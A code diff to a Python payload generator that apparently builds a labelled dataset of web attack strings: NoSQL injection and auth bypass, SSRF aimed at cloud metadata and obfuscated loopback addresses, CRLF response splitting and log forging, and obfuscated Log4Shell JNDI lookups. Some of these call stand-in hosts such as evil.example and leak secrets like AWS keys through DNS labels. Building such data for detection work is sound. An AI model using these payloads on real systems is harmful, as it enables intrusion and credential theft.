@@ -308,27 +308,78 @@ def _gen_ssti():
             yield wrap.format(expr), tpl
 
 
+def _roundrobin(*gens):
+    """Interleave several template sub-generators so a per-family cap
+    (`FAMILY_CAP`) keeps *every* template represented rather than exhausting
+    the first block alone. Without this, a family whose first template block
+    enumerates more payloads than its cap loses all its other templates, which
+    left `split_struct` with families holding too few templates to occupy three
+    disjoint splits (ssrf held only 2). Rebuilding produces >=5 templates each.
+    """
+    its = [iter(g) for g in gens]
+    while its:
+        alive = []
+        for it in its:
+            try:
+                yield next(it)
+                alive.append(it)
+            except StopIteration:
+                pass
+        its = alive
+
+
 _NOSQL_FIELD = ["username", "password", "email", "user", "id"]
 _NOSQL_OP = ["$ne", "$gt", "$lt", "$gte", "$regex", "$exists", "$nin"]
 _NOSQL_VAL = ["null", "\"\"", "1", "\"^a\"", "true", "undefined"]
 
 
-def _gen_nosqli():
+def _nosqli_op_obj():
     for f in _NOSQL_FIELD:
         for op in _NOSQL_OP:
             for v in _NOSQL_VAL:
                 yield f"{{\"{f}\":{{\"{op}\":{v}}}}}", "nosqli:op_obj"
+
+
+def _nosqli_bracket():
+    for f in _NOSQL_FIELD:
         yield f"[{f}][$ne]=", "nosqli:bracket"
+        for op in _NOSQL_OP:
+            yield f"[{f}][{op}]=1", "nosqli:bracket"
     for op in _NOSQL_OP:
         yield f"[{op}]=1", "nosqli:bracket"
+
+
+def _nosqli_where_js():
     for f in _NOSQL_FIELD:
         yield f"{{\"$where\":\"this.{f}.length > 0\"}}", "nosqli:where_js"
         yield f"';return this.{f}.match(/.*/)//", "nosqli:where_js"
-        yield f"{{\"{f}\":{{\"$regex\":\"^adm\"}}}}", "nosqli:regex"
     yield "';return true;var x='", "nosqli:where_js"
-    yield "' || '1'=='1", "nosqli:or_array"
     yield "{\"$where\":\"sleep(5000)\"}", "nosqli:where_js"
+
+
+def _nosqli_regex():
+    for f in _NOSQL_FIELD:
+        for pat in ("^adm", "^a", ".*", "^root"):
+            yield f"{{\"{f}\":{{\"$regex\":\"{pat}\"}}}}", "nosqli:regex"
+
+
+def _nosqli_or_array():
+    yield "' || '1'=='1", "nosqli:or_array"
     yield "{\"$or\":[{},{\"a\":\"a\"}]}", "nosqli:or_array"
+    for f in _NOSQL_FIELD:
+        yield f"{{\"$or\":[{{\"{f}\":1}},{{\"{f}\":{{\"$ne\":2}}}}]}}", "nosqli:or_array"
+
+
+def _nosqli_auth_bypass():
+    for f in _NOSQL_FIELD:
+        yield (f"{{\"{f}\":{{\"$ne\":null}},\"password\":{{\"$ne\":null}}}}",
+               "nosqli:auth_bypass")
+        yield f"{f}[$ne]=&password[$ne]=&submit=login", "nosqli:auth_bypass"
+
+
+def _gen_nosqli():
+    yield from _roundrobin(_nosqli_op_obj(), _nosqli_bracket(), _nosqli_where_js(),
+                           _nosqli_regex(), _nosqli_or_array(), _nosqli_auth_bypass())
 
 
 _SSRF_SCHEME = ["http", "https", "gopher", "dict", "file", "ftp", "ldap", "tftp"]
@@ -341,41 +392,93 @@ _SSRF_PATH = ["/", "/latest/meta-data/",
               "/computeMetadata/v1/", "/admin", "/_INFO"]
 
 
-def _gen_ssrf():
+def _ssrf_http():
     for host in _SSRF_HOST:
         for port in _SSRF_PORT:
             for path in _SSRF_PATH:
                 yield f"http://{host}{port}{path}", "ssrf:http_host_port_path"
+
+
+def _ssrf_scheme():
     for sch in _SSRF_SCHEME:
         yield f"{sch}://127.0.0.1/", "ssrf:scheme"
         yield f"{sch}://169.254.169.254/", "ssrf:scheme"
-    for host in ("2130706433", "0x7f000001", "0177.0.0.1", "017700000001"):
+
+
+def _ssrf_decimal_ip():
+    for host in ("2130706433", "0x7f000001", "0177.0.0.1", "017700000001",
+                 "127.1", "127.0.1", "0x7f.0.0.1", "0x7f000001"):
         yield f"http://{host}/admin", "ssrf:decimal_ip"
+        yield f"http://{host}/latest/meta-data/", "ssrf:decimal_ip"
+
+
+def _ssrf_redirect_chain():
     for host in _SSRF_HOST[:5]:
         yield f"http://evil.example/redirect?to=http://{host}/", "ssrf:redirect_chain"
         yield f"http://{host}#@evil.example/", "ssrf:redirect_chain"
+
+
+def _ssrf_userinfo():
+    # Credentials-in-authority confusion: the real host is after the '@' or the
+    # '#', a parser that trusts the userinfo half reads the decoy host.
+    for host in _SSRF_HOST[:6]:
+        yield f"http://expected.example@{host}/", "ssrf:userinfo"
+        yield f"http://{host}:80@evil.example/", "ssrf:userinfo"
+
+
+def _gen_ssrf():
+    yield from _roundrobin(_ssrf_http(), _ssrf_scheme(), _ssrf_decimal_ip(),
+                           _ssrf_redirect_chain(), _ssrf_userinfo())
 
 
 _CRLF_NAME = ["Set-Cookie", "Location", "X-Injected", "Content-Length",
               "X-XSS-Protection", "Refresh", "Link", "X-Forwarded-For"]
 _CRLF_VAL = ["admin=true", "sessid=hijack", "http://evil", "0", "1",
              "10.0.0.1", "<script>alert(1)</script>"]
-_CRLF_SEQ = [("%0d%0a", "crlf:header_inject"), ("%0a", "crlf:header_inject"),
-             ("%E5%98%8A%E5%98%8D", "crlf:unicode"), ("\\r\\n", "crlf:header_inject"),
-             ("%23%0d%0a", "crlf:header_inject"), ("%250d%250a", "crlf:double_enc")]
+def _crlf_header_inject():
+    for seq in ("%0d%0a", "%0a", "\\r\\n", "%23%0d%0a"):
+        for name in _CRLF_NAME:
+            for val in _CRLF_VAL:
+                yield f"{seq}{name}:%20{val}", "crlf:header_inject"
+
+
+def _crlf_unicode():
+    for name in _CRLF_NAME:
+        for val in _CRLF_VAL:
+            yield f"%E5%98%8A%E5%98%8D{name}:%20{val}", "crlf:unicode"
+
+
+def _crlf_double_enc():
+    for name in _CRLF_NAME:
+        for val in _CRLF_VAL:
+            yield f"%250d%250a{name}:%20{val}", "crlf:double_enc"
+
+
+def _crlf_content_len():
+    for n in ("0", "5", "10", "20", "100"):
+        yield (f"%0d%0aContent-Length:%20{n}%0d%0a%0d%0a<html>hi</html>",
+               "crlf:content_len")
+
+
+def _crlf_response_split():
+    for body in ("<html>x</html>", "{\"ok\":1}", "alert(1)", "pwned", "redirected"):
+        yield (f"%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0a{body}",
+               "crlf:response_split")
+
+
+def _crlf_log_forge():
+    # Log forging: a smuggled newline appends a fabricated log line.
+    for u in ("admin", "root", "system", "operator"):
+        yield (f"%0d%0a[INFO]%20user%20{u}%20logged%20in%20successfully",
+               "crlf:log_forge")
+        yield (f"%0aWARN%20auth%20bypass%20granted%20for%20{u}%0d%0a",
+               "crlf:log_forge")
 
 
 def _gen_crlf():
-    for seq, tpl in _CRLF_SEQ:
-        for name in _CRLF_NAME:
-            for val in _CRLF_VAL:
-                yield f"{seq}{name}:%20{val}", tpl
-    for n in ("0", "5", "10"):
-        yield (f"%0d%0aContent-Length:%20{n}%0d%0a%0d%0a<html>hi</html>",
-               "crlf:content_len")
-    for body in ("<html>x</html>", "{\"ok\":1}", "alert(1)"):
-        yield (f"%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0a{body}",
-               "crlf:response_split")
+    yield from _roundrobin(_crlf_header_inject(), _crlf_unicode(),
+                           _crlf_double_enc(), _crlf_content_len(),
+                           _crlf_response_split(), _crlf_log_forge())
 
 
 _LDAP_ATTR = ["uid", "cn", "mail", "password", "objectClass", "sn",
@@ -424,23 +527,47 @@ _JNDI_SCHEME = ["ldap", "ldaps", "rmi", "dns", "iiop", "nis", "corba", "nds"]
 _JNDI_HOST = ["attacker.example", "evil.example", "127.0.0.1:1099",
               "10.0.0.1:389", "${env:USER}.evil.example",
               "${sys:java.version}.evil.example", "127.0.0.1#evil.example"]
-_JNDI_OBF = [
-    "${{jndi:{s}://{h}/a}}",
-    "${{${{lower:j}}ndi:{s}://{h}/a}}",
-    "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:{s}://{h}/z}}",
-    "${{jndi:${{lower:{s}}}://{h}/a}}",
-    "${{${{env:X:-j}}ndi:{s}://{h}/a}}",
-]
+def _jndi_plain():
+    for s in _JNDI_SCHEME:
+        for h in _JNDI_HOST:
+            yield f"${{jndi:{s}://{h}/a}}", "jndi:plain"
+
+
+def _jndi_lower_bypass():
+    for s in ("ldap", "rmi", "dns"):
+        for h in _JNDI_HOST[:5]:
+            yield f"${{${{lower:j}}ndi:{s}://{h}/a}}", "jndi:lower_bypass"
+            yield f"${{jndi:${{lower:{s}}}://{h}/a}}", "jndi:lower_bypass"
+
+
+def _jndi_char_bypass():
+    for s in ("ldap", "rmi", "dns"):
+        for h in _JNDI_HOST[:5]:
+            yield (f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:{s}://{h}/z}}",
+                   "jndi:char_bypass")
+
+
+def _jndi_env_bypass():
+    for s in ("ldap", "rmi", "dns"):
+        for h in _JNDI_HOST[:5]:
+            yield f"${{${{env:X:-j}}ndi:{s}://{h}/a}}", "jndi:env_bypass"
+            yield (f"${{${{env:BARFOO:-j}}ndi${{env:BARFOO:-:}}{s}://{h}/x}}",
+                   "jndi:env_bypass")
+
+
+def _jndi_nested_lookup():
+    # The callback host is itself a runtime lookup, exfiltrating a secret in the
+    # DNS label the vulnerable server resolves.
+    for s in ("ldap", "rmi", "dns"):
+        for var in ("env:AWS_SECRET_ACCESS_KEY", "sys:java.version",
+                    "env:USER", "sys:user.name", "env:HOSTNAME"):
+            yield (f"${{jndi:{s}://${{{var}}}.evil.example/a}}",
+                   "jndi:nested_lookup")
 
 
 def _gen_jndi():
-    for s in _JNDI_SCHEME:
-        for h in _JNDI_HOST:
-            yield _JNDI_OBF[0].format(s=s, h=h), "jndi:plain"
-    for tpl in _JNDI_OBF[1:]:
-        for s in ("ldap", "rmi", "dns"):
-            for h in _JNDI_HOST[:5]:
-                yield tpl.format(s=s, h=h), "jndi:obfuscated"
+    yield from _roundrobin(_jndi_plain(), _jndi_lower_bypass(), _jndi_char_bypass(),
+                           _jndi_env_bypass(), _jndi_nested_lookup())
 
 
 _PP_KEY = [("__proto__", "pp:proto"), ("constructor.prototype", "pp:ctor"),
